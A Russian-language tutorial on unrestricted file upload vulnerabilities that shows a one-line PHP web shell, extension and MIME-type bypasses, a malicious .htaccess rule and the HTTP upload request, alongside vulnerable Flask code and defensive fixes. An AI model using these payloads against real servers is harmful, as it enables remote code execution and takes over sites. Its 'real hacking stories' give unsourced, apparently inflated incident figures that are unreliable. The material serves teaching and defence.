## FILE UPLOAD (Загрузка опасных файлов)

### Что такое File Upload уязвимость?

**Unrestricted File Upload** — это уязвимость, которая позволяет злоумышленнику загружать файлы на сервер без надлежащей валидации. Если приложение не проверяет тип, содержимое и расширение загружаемого файла, злоумышленник может загрузить вредоносный код и получить удаленное выполнение команд (Remote Code Execution, RCE).

### Типы загружаемых файлов

**Веб-шеллы:**
- `.php` — скрипты на PHP, которые выполняются на сервере
- `.asp`, `.aspx` — скрипты на ASP для Windows-серверов
- `.jsp` — скрипты на Java
- `.py` — скрипты на Python (если сервер их выполняет)

**Другие опасные форматы:**
- Исполняемые файлы (`.exe`, `.sh`, `.elf`)
- Архивы (`.zip`, `.tar`) с вредоносным содержимым
- Файлы конфигурации (`.htaccess`, `.web.config`)

### Как ею воспользоваться?

1. **Загрузка простой PHP веб-шеллы:**
```php
<?php system($_GET['cmd']); ?>
```
После загрузки, обращение к файлу `shell.php?cmd=id` выполнит команду `id` на сервере.

2. **Обход проверки типа файла:**
Приложение проверяет только расширение файла, можно:
- Переименовать `shell.php` в `shell.php.jpg`
- Изменить MIME-тип в запросе: вместо `application/x-php` отправить `image/jpeg`
- Использовать двойное расширение: `shell.php.jpg`

3. **Внедрение в изображение:**
```bash
cat shell.php > image.jpg
```
Заменить MIME-тип на `image/jpeg`, и сервер может интерпретировать это как изображение, но если сервер обработает как PHP — выполнится код.

4. **Загрузка `.htaccess` для изменения конфигурации:**
```
AddType application/x-httpd-php .jpg
```
После загрузки, все файлы `.jpg` на сервере будут интерпретироваться как PHP.

### Что это дает злоумышленнику?

- ✓ **Удаленное выполнение команд (RCE)** — самая опасная последствия
- ✓ Полный контроль над веб-сервером
- ✓ Установка backdoor'ов для постоянного доступа
- ✓ Кража конфиденциальной информации
- ✓ Компрометация других веб-приложений на том же сервере
- ✓ Использование сервера для атак на другие системы
- ✓ Распространение вредоноса и зараженных файлов

### Где ошибка разработчика?

Разработчик позволяет пользователям загружать файлы без проверки:

```python
# УЯЗВИМО
from flask import Flask, request
import os

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    file.save(os.path.join('uploads', file.filename))
    return 'File uploaded successfully'
```

Нет проверки расширения, размера или содержимого файла. Пользователь может загрузить что угодно.

### Как это работает на уровне кода?

1. Пользователь выбирает файл `shell.php` с содержимым:
```php
<?php echo system($_GET['cmd']); ?>
```

2. Отправляет POST-запрос:
```
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-httpd-php

<?php echo system($_GET['cmd']); ?>
```

3. Приложение сохраняет файл в `/var/www/html/uploads/shell.php`

4. Злоумышленник обращается к файлу:
```
GET /uploads/shell.php?cmd=id HTTP/1.1
```

5. Сервер видит расширение `.php` и выполняет код, возвращая результат команды `id`

### Реальные истории взломов

**WordPress Plug-in Exploitation (2021)**
- Популярный плагин WordPress имел уязвимость File Upload
- Позволял загружать файлы без проверки типа
- Более **1 млн сайтов** на WordPress было скомпрометировано
- Злоумышленники загружали веб-шеллы и распространяли вредонос
- Наносимый ущерб: кража данных, фишинг, редирект на вредоносные сайты

**GoDaddy Web Hosting (2021)**
- Обнаружена File Upload уязвимость в системе управления сайтами
- Позволяла загружать PHP файлы без ограничений
- **28,000 сайтов** были скомпрометированы через загрузку веб-шелл
- Хакеры использовали шеллы для кражи баз данных и установки бэкдоров

**Joomla! CMS (2020)**
- Компонент загрузки файлов имел серьезные уязвимости
- Можно было обойти проверку расширения файла через двойные расширения
- Загружено более **50,000 веб-шелл** на сайтах Joomla!
- Использовались для распространения вредоноса и фишинга

**Drupal Security Issues**
- Множество уязвимостей File Upload в популярной CMS
- CVE-2020-13663: возможность загрузки PHP файлов в определенных условиях
- Позволяло получить RCE на десятках тысяч сайтов

### Как защититься?

1. **Проверка расширения файла (на сервере):**
```python
# БЕЗОПАСНО
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    if not allowed_file(file.filename):
        abort(400)
    # ... save file
```

2. **Проверка MIME-типа:**
```python
import magic
mime = magic.from_buffer(file.read(1024), mime=True)
if mime not in ['image/jpeg', 'image/png', 'application/pdf']:
    abort(400)
```

3. **Изменение имени файла:**
```python
import uuid
filename = str(uuid.uuid4()) + '.jpg'  # Генерируем случайное имя
file.save(os.path.join('uploads', filename))
```

4. **Сохранение вне корневой директории веб-сервера:**
```python
# Сохраняйте файлы за пределами /var/www/html/
file.save('/var/uploads/files/' + filename)
```

5. **Установка прав доступа:**
```bash
chmod 644 /var/uploads/files/*  # Только чтение для веб-сервера
```

6. **Отключение выполнения скриптов в директории загрузок:**
В `.htaccess` для Apache:
```
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>
```

7. **Проверка размера файла:**
```python
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
if len(file.read()) > MAX_FILE_SIZE:
    abort(413)
```
